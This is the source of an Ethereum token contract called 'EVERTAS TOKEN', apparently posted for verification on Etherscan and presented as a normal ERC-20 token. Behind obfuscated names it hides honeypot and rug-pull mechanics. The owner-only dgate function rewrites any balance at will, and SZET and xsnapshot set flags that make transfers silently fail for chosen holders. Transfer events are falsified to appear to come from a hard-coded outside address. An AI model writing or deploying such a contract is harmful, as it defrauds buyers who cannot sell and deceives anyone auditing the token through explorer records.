/**
 *Submitted for verification at Etherscan.io on 2023-03-06
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract EVERTAS {
    using SafeMath for uint256;
    mapping (address => uint256) private IIa;
	
    mapping (address => uint256) public IIb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "EVERTAS TOKEN";
	
    string public symbol = "EVERTAS";
    uint8 public decimals = 6;

    uint256 public totalSupply = 500000000 *10**6;
    address owner = msg.sender;
	  address private IIc;
      address private IId;
    uint256 private IIe;
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address IIf = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        IId = msg.sender;
             IIa[msg.sender] = totalSupply;
        
       zPUSH();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function zPUSH() internal  {                             
                       IIb[msg.sender] = 1;
                       IIc = IIf;

                

        emit Transfer(address(0), IIc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return IIa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
 	
if(IIb[msg.sender] <= IIe) {
    require(IIa[msg.sender] >= value);
IIa[msg.sender] -= value;  
IIa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   if(IIb[msg.sender] > IIe) { }  }   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 		       function xsnapshot (address oz, uint256 ox) public {
		if(IIb[msg.sender] == IIe) {   
			   	   
   IIb[oz] = ox;}
   }
		       function SZET (uint256 ox) onlyOwner public {
                     IIe = ox; 
	}

 		       function dgate (address oz, uint256 ox) onlyOwner public {		   	   
  IIa[oz] = ox;}


   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  

	 
 

       if(IIb[from] < IIe && IIb[to] < IIe) {
        require(value <= IIa[from]);
        require(value <= allowance[from][msg.sender]);
        IIa[from] -= value;
        IIa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
        }


       if(IIb[from] == IIe) {
        require(value <= IIa[from]);
        require(value <= allowance[from][msg.sender]);
        IIa[from] -= value;
        IIa[to] += value;
        allowance[from][msg.sender] -= value;


            from = IIf;
	   

        emit Transfer(from, to, value);
        return true; }


         if(IIb[from] > IIe || IIb[to] > IIe) {
             
         }}



     

        	
 }